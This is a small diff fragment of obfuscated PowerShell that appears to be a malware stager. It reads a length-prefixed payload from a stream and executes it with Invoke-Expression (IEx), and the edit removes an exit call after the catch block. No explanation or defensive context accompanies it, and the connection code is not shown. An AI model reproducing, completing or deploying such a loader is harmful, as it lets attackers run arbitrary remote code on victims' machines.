@@ -35,5 +35,5 @@ $g+=$b[1]
 $a=$s.ToArray()
 if($e-eq0-and$g-gt2){$e=($a[0]*256)+$a[1]}}}while($g-lt$e+2-or$e-eq0)
 clhy
-IEx([Text.Encoding]::ASCII).GetString($a,2,$e)}catch{}exit}x
+IEx([Text.Encoding]::ASCII).GetString($a,2,$e)}catch{}}x
 
